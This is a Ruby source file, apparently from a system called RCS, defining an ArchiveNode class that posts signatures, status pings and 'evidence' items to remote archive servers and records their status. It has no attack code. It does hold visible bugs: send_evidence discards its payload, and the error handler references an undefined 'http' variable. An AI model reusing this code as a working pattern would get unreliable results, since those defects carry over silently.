require 'thread'
require 'rest-client'
require 'rcs-common/trace'
require 'em-http-request'
require_relative 'db_objects/status'
require_relative 'db_objects/signature'

module RCS
  module DB
    class ArchiveNode
      include RCS::Tracer
      extend RCS::Tracer

      attr_reader :address

      def initialize(address)
        @address = address
      end

      def signature
        Signature.where(scope: 'network').first.try(:value)
      end

      def status
        Status.where(address: address, type: 'archive').first
      end

      def setup!
        body = {signatures: ::Signature.all.to_json}
        request("/sync/setup", body)
      end

      def ping!
        request("/sync/status") do |result, content|
          if result == :success
            update_status(content[:status])
          else
            update_status(status: ::Status::ERROR, info: content)
          end
        end
      end

      def send_evidence(evidence, path)
        body = {evidence: evidence, path: path}
        request("/sync/evidence")
      end

      # TODO
      # def send_items(items) do
      # end

      def request(path, body = {})
        url = "https://#{address}#{path}"
        body = body.respond_to?(:to_json) ? body.to_json : body
        trace :debug, "POST #{address} (archive) #{path} #{body}"
        headers = {x_sync_signature: signature}
        RestClient::Request.execute(:method => :post, :url => url, :payload => body, :headers => headers, :timeout => 3, :open_timeout => 3) do |resp|
          trace :debug, "RESP #{resp.code} from #{address} (archive) #{resp.body}"
          content = JSON.parse(resp.body).symbolize_keys rescue {}
          if resp.code != 200
            yield(:error, content[:msg] || "Got error #{resp.code} from server") if block_given?
          else
            yield(:success, content) if block_given?
          end
        end
      rescue Exception => error
        message = http.error.exception.message rescue nil
        message = error.message if message.blank?
        trace :warn, "POST ERROR #{address} (archive) #{path} #{message}"
        yield(:error, "Unable to reach #{address}. #{message}") if block_given?
      end

      # def request(path, body = {})
      #   body = body.respond_to?(:to_json) ? body.to_json : body
      #   trace :debug, "POST #{address} (archive) #{path} #{body}"
      #   url = "https://#{address}/"
      #   headers = {x_sync_signature: signature}
      #   connection_options = {connect_timeout: 3, inactivity_timeout: 3}
      #   request_options = {head: headers, body: body, keepalive: true, path: path}

      #   http = EventMachine::HttpRequest.new(url, connection_options).post(request_options)

      #   http.errback do
      #     message = http.error.exception.message rescue nil
      #     trace :warn, "POST ERROR #{address} (archive) #{path} #{message || 'error'}"
      #     yield(:error, "Unable to reach #{address}. #{message}") if block_given?
      #   end

      #   http.callback do
      #     code = http.response_header.status
      #     body = http.response
      #     trace :debug, "RESP #{code} from #{address} (archive) #{body}"
      #     content = JSON.parse(body).symbolize_keys rescue {}
      #     if code != 200
      #       yield(:error, content[:msg] || "Got error #{code} from server") if block_given?
      #     else
      #       yield(:success, content) if block_given?
      #     end
      #   end
      # end

      def update_status(attributes)
        current = status.try(:attributes) || {}
        attributes = current.symbolize_keys.merge(attributes.symbolize_keys)
        stats = attributes.reject { |key| ![:disk, :cpu, :pcpu].include?(key) }
        status_code = ::Status::STATUS_CODE.find { |key, val| val == attributes[:status] }.try(:first) || attributes[:status]
        # attributes[:info] = 'Online' if status_code == 'OK'
        params = ["RCS::DB (Archive)", address, status_code, attributes[:info], stats, 'archive', attributes[:version]]

        ::Status.status_update(*params)
      end

      def destroy
        status.destroy if status
      end

      def self.all
        addresses = ::Connector.where(type: 'archive').only(:dest).distinct(:dest)
        addresses.map! { |addr| new(addr) }
      end
    end
  end
end
